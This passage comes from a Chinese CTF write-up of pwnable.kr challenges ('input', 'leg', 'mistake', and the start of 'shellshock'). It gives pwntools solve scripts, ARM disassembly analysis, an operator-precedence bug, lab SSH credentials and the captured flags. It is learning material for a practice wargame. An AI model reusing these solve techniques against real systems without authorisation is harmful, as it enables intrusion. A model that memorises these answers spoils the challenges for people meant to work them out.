if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
read(2, buf, 4);
if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
printf("Stage 2 clear!\n");
```

其中`read()`函数用于从文件描述符 `fd` 指定的文件中读取数据，并将读取的内容存储到 `buf` 指向的缓冲区中，最多读取 `count` 字节的数据，其函数声明如下：

```c
ssize_t read(int fd, void *buf, size_t count);
```

文件描述符`fd`用来标识要读取的文件。通常情况下，`0` 表示标准输入`STDIN`，`1` 表示标准输出`STDOUT`，`2` 表示标准错误输出`STDERR`，其他文件描述符通常由打开文件或套接字等操作获得。而在该程序中，分别从`STDIN`和`STDERR`进行读取。所以我们需要将输入传递给`STDIN`和`STDERR`，可以利用`os.pipe()`制作管道并传递给`process()`。

```python
r1, w1 = os.pipe()
os.write(w1, '\x00\x0a\x00\xff')
r2, w2 = os.pipe()
os.write(w2, '\x00\x0a\x02\xff')
```

然后来看 `env` 这部分代码，我们必须把环境变量`0xdeadbeef` 的值设置为`0xcafebabe`。

```c
if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
printf("Stage 3 clear!\n");
```

这一步很简单，直接弄个`env`传递给`process()`即可。

```python
env = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}
```

现在来看 `file` 这部分代码，程度以只读权限打开文件`\x0a`，从中读取一个值并和`\x00\x00\x00\x00`进行比较。

```c
FILE* fp = fopen("\x0a", "r");
if(!fp) return 0;
if( fread(buf, 4, 1, fp)!=1 ) return 0;
if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
fclose(fp);
printf("Stage 4 clear!\n");
```

我们可以创建并打开文件`\x0a`，并将数值`\x00\x00\x00\x00`写入其中。

```python
with open('\x0a', 'w') as f:
    f.write('\x00\x00\x00\x00')
```

最后来看 `network` 这部分代码，程序由第`66`个参数指定`socket`的通信端口，然后通过网络接收`4`个字节，并将接收到的数据与字符串`"\xde\xad\xbe\xef"`进行比较。

```c
int sd, cd;
struct sockaddr_in saddr, caddr;
sd = socket(AF_INET, SOCK_STREAM, 0);   // 创建一个可以使用IPv4地址进行通信的套接字，指定使用TCP协议
if(sd == -1){
    printf("socket error, tell admin\n");
    return 0;
}
saddr.sin_family = AF_INET;
saddr.sin_addr.s_addr = INADDR_ANY;
saddr.sin_port = htons( atoi(argv['C']) );   // 程序由第66个参数指定端口
if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){  // 使用bind函数将套接字绑定到指定的地址和端口上
    printf("bind error, use another port\n");
    return 1;
}
listen(sd, 1);  // 使用listen函数开始监听连接请求，最大连接数为1
int c = sizeof(struct sockaddr_in);
cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c); // 接受客户端的连接请求，新套接字cd用于与客户端进行通信
if(cd < 0){
    printf("accept error, tell admin\n");
    return 0;
}
if( recv(cd, buf, 4, 0) != 4 ) return 0;  // 从客户端接收数据，最多接收4字节存储在buf中，
if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;  // 如果接收的数据与"\xde\xad\xbe\xef"相等则通过验证
printf("Stage 5 clear!\n");
```

所以我们需要在程序的第`66`个参数添加端口号，并建立网络连接发送`4`个字节的数据`"\xde\xad\xbe\xef"`。完整的`Python`代码如下：

```python
from pwn import *
import os

shell = ssh(user='input2', host='pwnable.kr', port=2222, password='guest')
# Stage 1
args = ['A']*100
args[ord('A')] = '\x00'
args[ord('B')] = '\x20\x0a\x0d'
# Stage 2
r1, w1 = os.pipe()
os.write(w1, b'\x00\x0a\x00\xff')
r2, w2 = os.pipe()
os.write(w2, b'\x00\x0a\x02\xff')
# Stage 3
env = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}
# Stage 4
with open('\x0a', 'w') as f:
    f.write('\x00\x00\x00\x00')  
# Stage 5
port = 6666
args[ord('C')] = str(port)
io = shell.process(executable='./input', argv=args, stdin=r1, stderr=r2, env=env)
net = remote(shell.host, port)
net.sendline(b'\xde\xad\xbe\xef')
io.interactive()
io.close()
shell.close()
```

然而打不通！woc！`[ERROR] Could not connect to pwnable.kr on port 6666`。先`ssh`进入目标系统，然后以`input2@pwnable`的身份在`/tmp`目录下编写并运行`.py`文件，这样应该就不会因为防火墙的问题无法连接端口建立通信啦。

```bash
input2@pwnable:~$ mkdir /tmp/t0ur1st
input2@pwnable:~$ cd /tmp/t0ur1st
input2@pwnable:/tmp/t0ur1st$ ln -s /home/input2/flag flag
input2@pwnable:/tmp/t0ur1st$ vim exp.py
```

在`exp.py`中编写以下`Python`代码：

```python
from pwn import *
import os

args = ['A']*100
args[ord('A')] = '\x00'
args[ord('B')] = '\x20\x0a\x0d'
# Stage 2
r1, w1 = os.pipe()
os.write(w1, b'\x00\x0a\x00\xff')
r2, w2 = os.pipe()
os.write(w2, b'\x00\x0a\x02\xff')
# Stage 3
env = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}
# Stage 4
with open('\x0a', 'w') as f:
    f.write('\x00\x00\x00\x00')
# Stage 5
port = 6666
args[ord('C')] = str(port)
io = process(executable='/home/input2/input', argv=args, stdin=r1, stderr=r2, env=env)
net = remote('localhost', port)
net.sendline('\xde\xad\xbe\xef')
io.interactive()
```

`:wq`保存退出`vim`后运行`exp.py`可以得到`flag`：`Mommy! I learned how to pass various input in Linux :)`。

```bash
input2@pwnable:/tmp/t0ur1st$ python exp.py
[+] Starting local process '/home/input2/input': pid 147462
[+] Opening connection to localhost on port 6666: Done
[*] Switching to interactive mode
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
[*] Process '/home/input2/input' stopped with exit code 0 (pid 147462)
Mommy! I learned how to pass various input in Linux :)
```

------

### leg

这是**Pwnable.kr**的第八个挑战`leg`，来自**[Toddler's Bottle]**部分。

```bash
Daddy told me I should study arm.
But I prefer to study my leg!

Download : http://pwnable.kr/bin/leg.c
Download : http://pwnable.kr/bin/leg.asm

ssh leg@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机，这是失败啦？！并没有，只是显示形式跟以前不一样而已。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh leg@pwnable.kr -p2222
leg@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have new mail.
Last login: Fri Jun  9 02:22:19 2023 from 121.18.90.140
pulseaudio: pa_context_connect() failed
pulseaudio: Reason: Connection refused
pulseaudio: Failed to initialize PA contextaudio: Could not init `pa' audio driver
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
Uncompressing Linux... done, booting the kernel.
[    0.000000] Booting Linux on physical CPU 0x0
[    0.000000] Linux version 3.11.4 (acez@pondicherry) (gcc version 4.7.3 (Sourcery CodeBench Lite 2013.05-24) ) #5 Sat Oct 12 00:15:00 EDT 2013
[    0.000000] CPU: ARM926EJ-S [41069265] revision 5 (ARMv5TEJ), cr=00093177
[    0.000000] CPU: VIVT data cache, VIVT instruction cache
[    0.000000] Machine: ARM-Versatile PB
[    0.000000] Memory policy: ECC disabled, Data cache writeback
[    0.000000] sched_clock: 32 bits at 24MHz, resolution 41ns, wraps every 178956ms
[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 16256
[    0.000000] Kernel command line: 'root=/dev/ram rw console=ttyAMA0 rdinit=/sbin/init oops=panic panic=1 quiet'
[    0.000000] PID hash table entries: 256 (order: -2, 1024 bytes)
[    0.000000] Dentry cache hash table entries: 8192 (order: 3, 32768 bytes)
[    0.000000] Inode-cache hash table entries: 4096 (order: 2, 16384 bytes)
[    0.000000] Memory: 59760K/65536K available (2522K kernel code, 150K rwdata, 656K rodata, 112K init, 93K bss, 5776K reserved)
[    0.000000] Virtual kernel memory layout:
[    0.000000]     vector  : 0xffff0000 - 0xffff1000   (   4 kB)
[    0.000000]     fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)
[    0.000000]     vmalloc : 0xc4800000 - 0xff000000   ( 936 MB)
[    0.000000]     lowmem  : 0xc0000000 - 0xc4000000   (  64 MB)
[    0.000000]     modules : 0xbf000000 - 0xc0000000   (  16 MB)
[    0.000000]       .text : 0xc0008000 - 0xc0322cc8   (3180 kB)
[    0.000000]       .init : 0xc0323000 - 0xc033f22c   ( 113 kB)
[    0.000000]       .data : 0xc0340000 - 0xc0365b20   ( 151 kB)
[    0.000000]        .bss : 0xc0365b20 - 0xc037d2bc   (  94 kB)
[    0.000000] NR_IRQS:224
[    0.000000] VIC @f1140000: id 0x00041190, vendor 0x41
[    0.000000] FPGA IRQ chip 0 "SIC" @ f1003000, 13 irqs
[    0.000000] Console: colour dummy device 80x30
[    0.016940] Calibrating delay loop... 597.19 BogoMIPS (lpj=2985984)
[    0.174364] pid_max: default: 32768 minimum: 301
[    0.175031] Mount-cache hash table entries: 512
[    0.180933] CPU: Testing write buffer coherency: ok
[    0.185824] Setting up static identity map for 0xc0265c80 - 0xc0265cbc
[    0.194838] NET: Registered protocol family 16
[    0.196256] DMA: preallocated 256 KiB pool for atomic coherent allocations
[    0.200731] Serial: AMBA PL011 UART driver
[    0.202016] dev:f1: ttyAMA0 at MMIO 0x101f1000 (irq = 44) is a PL011 rev1
[    0.208510] console [ttyAMA0] enabled
[    0.209503] dev:f2: ttyAMA1 at MMIO 0x101f2000 (irq = 45) is a PL011 rev1
[    0.209928] dev:f3: ttyAMA2 at MMIO 0x101f3000 (irq = 46) is a PL011 rev1
[    0.210309] fpga:09: ttyAMA3 at MMIO 0x10009000 (irq = 70) is a PL011 rev1
[    0.216279] bio: create slab <bio-0> at 0
[    0.222884] Switched to clocksource timer3
[    0.230747] NET: Registered protocol family 2
[    0.235390] TCP established hash table entries: 512 (order: 0, 4096 bytes)
[    0.235637] TCP bind hash table entries: 512 (order: -1, 2048 bytes)
[    0.235916] TCP: Hash tables configured (established 512 bind 512)
[    0.236516] TCP: reno registered
[    0.236687] UDP hash table entries: 256 (order: 0, 4096 bytes)
[    0.236922] UDP-Lite hash table entries: 256 (order: 0, 4096 bytes)
[    0.238401] NET: Registered protocol family 1
[    0.240729] RPC: Registered named UNIX socket transport module.
[    0.240931] RPC: Registered udp transport module.
[    0.241063] RPC: Registered tcp transport module.
[    0.241188] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.245724] Trying to unpack rootfs image as initramfs...
[    0.414702] Freeing initrd memory: 1584K (c2000000 - c218c000)
[    0.415048] NetWinder Floating Point Emulator V0.97 (double precision)
[    0.420812] Installing knfsd (copyright (C) 1996 okir@monad.swb.de).
[    0.421653] msgmni has been set to 119
[    0.445608] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 254)
[    0.445936] io scheduler noop registered
[    0.446089] io scheduler deadline registered
[    0.446310] io scheduler cfq registered (default)
[    0.447059] clcd-pl11x dev:20: PL110 rev0 at 0x10120000
[    0.449213] clcd-pl11x dev:20: Versatile hardware, VGA display
[    0.479890] Console: switching to colour frame buffer device 80x60
[    0.492416] brd: module loaded
[    0.493277] physmap platform flash device: 04000000 at 34000000
[    0.501322] physmap-flash.0: Found 1 x32 devices at 0x0 in 32-bit bank. Manufacturer ID 0x000000 Chip ID 0x000000
[    0.501892] Intel/Sharp Extended Query Table at 0x0031
[    0.502472] Using buffer write method
[    0.510258] smc91x.c: v1.1, sep 22 2004 by Nicolas Pitre <nico@fluxnic.net>
[    0.523752] eth0: SMC91C11xFD (rev 1) at c496e000 IRQ 57 [nowait]
[    0.524028] eth0: Ethernet addr: 52:54:00:12:34:56
[    0.525246] mousedev: PS/2 mouse device common for all mice
[    0.528698] TCP: cubic registered
[    0.528842] NET: Registered protocol family 17
[    0.529524] NET: Registered protocol family 37
[    0.529773] VFP support v0.3: implementor 41 architecture 1 part 10 variant 9 rev 0
[    0.538801] Freeing unused kernel memory: 112K (c0323000 - c033f000)
cttyhack: can't open '/dev/ttyS0': No such file or directory
sh: can't access tty; job control turned off
/ $ [    0.626218] input: AT Raw Set 2 keyboard as /devices/fpga:06/serio0/input/input0
[    1.225792] input: ImExPS/2 Generic Explorer Mouse as /devices/fpga:07/serio1/input/input1
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
/ $ ls -la
total 628
drwxr-xr-x   11 root     0                0 Nov 10  2014 .
drwxr-xr-x   11 root     0                0 Nov 10  2014 ..
drwxrwxr-x    2 root     0                0 Nov 10  2014 bin
drwxrwxr-x    2 root     0                0 Nov 10  2014 boot
drwxrwxr-x    2 root     0                0 Nov 10  2014 dev
drwxrwxr-x    3 root     0                0 Nov 10  2014 etc
-r--------    1 1001     0               38 Nov 10  2014 flag
---s--x---    1 1001     1000        636419 Nov 10  2014 leg
lrwxrwxrwx    1 root     0               11 Nov 10  2014 linuxrc -> bin/busybox
dr-xr-xr-x   32 root     0                0 Jan  1 00:00 proc
drwxrwxr-x    2 root     0                0 Nov 10  2014 root
drwxrwxr-x    2 root     0                0 Nov 10  2014 sbin
drwxrwxr-x    2 root     0                0 Nov 10  2014 sys
drwxrwxr-x    4 root     0                0 Nov 10  2014 usr
```

先回到自己的系统，来看看题目提供的`.c`文件。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/leg.c 

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ cat ./leg.c
#include <stdio.h>
#include <fcntl.h>

int key1(){
    asm("mov r3, pc\n");
}

int key2(){
    asm(
    "push   {r6}\n"
    "add    r6, pc, $1\n"
    "bx     r6\n"
    ".code   16\n"
    "mov    r3, pc\n"
    "add    r3, $0x4\n"
    "push   {r3}\n"
    "pop    {pc}\n"
    ".code  32\n"
    "pop    {r6}\n"
    );
}

int key3(){
    asm("mov r3, lr\n");
}

int main(){
    int key=0;
    printf("Daddy has very strong arm! : ");
    scanf("%d", &key);
    if( (key1()+key2()+key3()) == key ){
        printf("Congratz!\n");
        int fd = open("flag", O_RDONLY);
        char buf[100];
        int r = read(fd, buf, 100);
        write(0, buf, r);
    }
    else{
        printf("I have strong leg :P\n");
    }
    return 0;
}
```

通过审计`C`语言代码可知，我们需要输入一个`key`使得表达式`(key1()+key2()+key3()) == key`为真。再来看看`leg.asm`。

```assembly
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/leg.asm

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ cat ./leg.asm                     
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:     push    {r4, r11, lr}
   0x00008d40 <+4>:     add     r11, sp, #8
   0x00008d44 <+8>:     sub     sp, sp, #12
   0x00008d48 <+12>:    mov     r3, #0
   0x00008d4c <+16>:    str     r3, [r11, #-16]
   0x00008d50 <+20>:    ldr     r0, [pc, #104]  ; 0x8dc0 <main+132>
   0x00008d54 <+24>:    bl      0xfb6c <printf>
   0x00008d58 <+28>:    sub     r3, r11, #16
   0x00008d5c <+32>:    ldr     r0, [pc, #96]   ; 0x8dc4 <main+136>
   0x00008d60 <+36>:    mov     r1, r3
   0x00008d64 <+40>:    bl      0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:    bl      0x8cd4 <key1>
   0x00008d6c <+48>:    mov     r4, r0
   0x00008d70 <+52>:    bl      0x8cf0 <key2>
   0x00008d74 <+56>:    mov     r3, r0
   0x00008d78 <+60>:    add     r4, r4, r3
   0x00008d7c <+64>:    bl      0x8d20 <key3>
   0x00008d80 <+68>:    mov     r3, r0
   0x00008d84 <+72>:    add     r2, r4, r3
   0x00008d88 <+76>:    ldr     r3, [r11, #-16]
   0x00008d8c <+80>:    cmp     r2, r3
   0x00008d90 <+84>:    bne     0x8da8 <main+108>
   0x00008d94 <+88>:    ldr     r0, [pc, #44]   ; 0x8dc8 <main+140>
   0x00008d98 <+92>:    bl      0x1050c <puts>
   0x00008d9c <+96>:    ldr     r0, [pc, #40]   ; 0x8dcc <main+144>
   0x00008da0 <+100>:   bl      0xf89c <system>
   0x00008da4 <+104>:   b       0x8db0 <main+116>
   0x00008da8 <+108>:   ldr     r0, [pc, #32]   ; 0x8dd0 <main+148>
   0x00008dac <+112>:   bl      0x1050c <puts>
   0x00008db0 <+116>:   mov     r3, #0
   0x00008db4 <+120>:   mov     r0, r3
   0x00008db8 <+124>:   sub     sp, r11, #8
   0x00008dbc <+128>:   pop     {r4, r11, pc}
   0x00008dc0 <+132>:   andeq   r10, r6, r12, lsl #9
   0x00008dc4 <+136>:   andeq   r10, r6, r12, lsr #9
   0x00008dc8 <+140>:                   ; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:                   ; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:   andeq   r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:     push    {r11}           ; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:     add     r11, sp, #0
   0x00008cdc <+8>:     mov     r3, pc
   0x00008ce0 <+12>:    mov     r0, r3
   0x00008ce4 <+16>:    sub     sp, r11, #0
   0x00008ce8 <+20>:    pop     {r11}           ; (ldr r11, [sp], #4)
   0x00008cec <+24>:    bx      lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:     push    {r11}           ; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:     add     r11, sp, #0
   0x00008cf8 <+8>:     push    {r6}            ; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:    add     r6, pc, #1
   0x00008d00 <+16>:    bx      r6
   0x00008d04 <+20>:    mov     r3, pc
   0x00008d06 <+22>:    adds    r3, #4
   0x00008d08 <+24>:    push    {r3}
   0x00008d0a <+26>:    pop     {pc}
   0x00008d0c <+28>:    pop     {r6}            ; (ldr r6, [sp], #4)
   0x00008d10 <+32>:    mov     r0, r3
   0x00008d14 <+36>:    sub     sp, r11, #0
   0x00008d18 <+40>:    pop     {r11}           ; (ldr r11, [sp], #4)
   0x00008d1c <+44>:    bx      lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:     push    {r11}           ; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:     add     r11, sp, #0
   0x00008d28 <+8>:     mov     r3, lr
   0x00008d2c <+12>:    mov     r0, r3
   0x00008d30 <+16>:    sub     sp, r11, #0
   0x00008d34 <+20>:    pop     {r11}           ; (ldr r11, [sp], #4)
   0x00008d38 <+24>:    bx      lr
End of assembler dump.
```

这是`ARM`体系架构的汇编程序，查看main <+48>，<+56>，<+68>，可以看到返回值存储在`$r0`寄存器中。先来看`key1()`，当调用 `key1()` 函数时，会执行该汇编指令，将 `$pc` 寄存器的值（即下一条指令的地址）移动到 `r3` 寄存器中，并成为函数的返回值。该汇编指令执行完后，程序计数器`$pc`跳转到了下一条的指令，而指令计数器又用于存放下一条指令所在单元的地址，此时是`0x00008ce4`。

```assembly
0x00008cdc <+8>:     mov     r3, pc
0x00008ce0 <+12>:    mov     r0, r3   # 上条指令执行完后这条指令为当前指令，PC指向下一条指令所在单元的地址
0x00008ce4 <+16>:    sub     sp, r11, #0
```

因此`key1()`的返回值是`0x00008ce4`。接着来看`key2()`，当程序运行完`0x00008d04`处的指令时，`$pc`此时值为`0x00008d08`，所以`$r3`被赋值为`0x00008d08`，接着执行完指令`0x00008d06 <+22>:  adds r3, #4`后，`$r3`的值为`0x00008d0c`。之后`$r3`寄存器没有再被修改。

```assembly
0x00008cf8 <+8>:     push    {r6}            ; (str r6, [sp, #-4]!)
0x00008cfc <+12>:    add     r6, pc, #1
0x00008d00 <+16>:    bx      r6
0x00008d04 <+20>:    mov     r3, pc
0x00008d06 <+22>:    adds    r3, #4
0x00008d08 <+24>:    push    {r3}
0x00008d0a <+26>:    pop     {pc}
0x00008d0c <+28>:    pop     {r6}            ; (ldr r6, [sp], #4)
```

因此`key2()`的返回值是`0x00008d0c`，为什么`key2()` 函数的返回值还是由`$r3`决定呢？ 

> `int key2()` 函数使用汇编指令来获取当前指令的地址并将其作为返回值。下面是对`key2()` 函数中代码的解释：
>
> 1. 首先，将 `r6` 寄存器保存到栈中，为了后续的恢复。
> 2. 使用 `add r6, pc, $1` 指令将 `pc` 寄存器的值加 1，并将结果存储在 `r6` 寄存器中。
> 3. 使用 `bx r6` 指令将程序控制转移到 `r6` 寄存器所指示的地址。
> 4. 使用 `.code 16` 指令切换到 16 位 Thumb 指令集。
> 5. 使用 `mov r3, pc` 指令将 `pc` 寄存器的值移动到 `r3` 寄存器中。
> 6. 使用 `add r3, $0x4` 指令将 `r3` 寄存器的值增加 4，即跳过下一条指令的地址，使其指向函数的下一条指令。
> 7. 将 `r3` 寄存器的值保存到栈中。
> 8. 使用 `pop {pc}` 指令将栈顶的值弹出到 `pc` 寄存器中，即将 `r3` 寄存器中的值作为返回地址。
> 9. 使用 `.code 32` 指令切换回 32 位 ARM 指令集。
> 10. 最后，恢复之前保存的 `r6` 寄存器的值。
>
> 因此，通过执行这些汇编指令，将 `pc` 寄存器中的值移动到 `r3` 寄存器中，并将其作为函数的返回值返回给调用方。

最后来看`key3()`，结果存储在`$r3`，其值为`$lr`，而`$lr`存储着返回地址。

```assembly
0x00008d28 <+8>:     mov     r3, lr
0x00008d2c <+12>:    mov     r0, r3
```

回过头看`main`的汇编代码，发现返回地址是`0x00008d80`。

```assembly
0x00008d7c <+64>:    bl      0x8d20 <key3>
0x00008d80 <+68>:    mov     r3, r0
```

因此`key3()`的返回值是`0x00008d80`，所以`key = 0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400`。

`SSH`连接目标系统，在终端运行二进制文件`leg`，并输入`key`值`108400`，得到`flag`：`My daddy has a lot of ARMv5te muscle!`。

```bash
$ ./leg
Daddy has very strong arm! : 108400
Congratz!
My daddy has a lot of ARMv5te muscle!
```

------

### mistake

这是**Pwnable.kr**的第九个挑战`mistake`，来自**[Toddler's Bottle]**部分。

```bash
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)

This task is based on real event
Thanks to dhmonkey

hint : operator priority

ssh mistake@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh mistake@pwnable.kr -p2222
mistake@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 04:26:08 2023 from 77.127.99.41
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
mistake@pwnable:~$ ls -la
total 44
drwxr-x---   5 root        mistake 4096 Oct 23  2016 .
drwxr-xr-x 117 root        root    4096 Nov 10  2022 ..
d---------   2 root        root    4096 Jul 29  2014 .bash_history
-r--------   1 mistake_pwn root      51 Jul 29  2014 flag
dr-xr-xr-x   2 root        root    4096 Aug 20  2014 .irssi
-r-sr-x---   1 mistake_pwn mistake 8934 Aug  1  2014 mistake
-rw-r--r--   1 root        root     792 Aug  1  2014 mistake.c
-r--------   1 mistake_pwn root      10 Jul 29  2014 password
drwxr-xr-x   2 root        root    4096 Oct 23  2016 .pwntools-cache
```

我们可以看到三个文件`mistake`、`mistake.c`和`flag`，其中`mistake`是`ELF`二进制可执行文件，`mistake.c`是编译二进制文件的`C`代码，用户`mistake`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat mistake.c`来查看`mistake.c`的代码。

```c
mistake@pwnable:~$ cat mistake.c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
    int i;
    for(i=0; i<len; i++){
        s[i] ^= XORKEY;
    }
}

int main(int argc, char* argv[]){

    int fd;
    if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
        printf("can't open password %d\n", fd);
        return 0;
    }

    printf("do not bruteforce...\n");
    sleep(time(0)%20);

    char pw_buf[PW_LEN+1];
    int len;
    if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
        printf("read error\n");
        close(fd);
        return 0;
    }

    char pw_buf2[PW_LEN+1];
    printf("input password : ");
    scanf("%10s", pw_buf2);

    // xor your input
    xor(pw_buf2, 10);

    if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
        printf("Password OK\n");
        system("/bin/cat flag\n");
    }
    else{
        printf("Wrong Password\n");
    }

    close(fd);
    return 0;
}
```

先来分析主函数的这部分代码：

```c
int fd;
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
    printf("can't open password %d\n", fd);
    return 0;
}
```

在这段代码中，编程者想的是：`open` 函数用于打开文件 `/home/mistake/password` 并返回文件描述符，然后将返回值与 `0` 进行比较。然而，由于运算符优先级的问题，条件判断的结果可能会出现错误。因为实际上，`<` 运算符的优先级高于 `=` 运算符，所以 `<` 运算符会在 `=` 运算符之前进行计算。这意味着 `open` 函数的返回值`1`会先与`0`进行比较，然后结果`0`会赋值给 `fd` 变量，因此该`if`语句实际上可以理解为`if(fd = 0)`。而`fd = 0`时是标准输入`STDIN`，这意味着用户能进行俩次输入，并且密码实际上是由用户的第一次输入所决定。用户第二次输入的密码会传递给`xor()`函数进行异或运算，所以答案已经显而易见啦。运行`./mistake`，第一次输入长度为`10`的全`1`字符串，第二次输入等长的全`0`字符串即可拿到`flag`：`Mommy, the operator priority always confuses me :(`。

```bash
mistake@pwnable:~$ ./mistake
do not bruteforce...
1111111111
input password : 0000000000
Password OK
Mommy, the operator priority always confuses me :(
```

------

### shellshock

这是**Pwnable.kr**的第十个挑战`shellshock`，来自**[Toddler's Bottle]**部分。

```bash
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh shellshock@pwnable.kr -p2222
shellshock@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
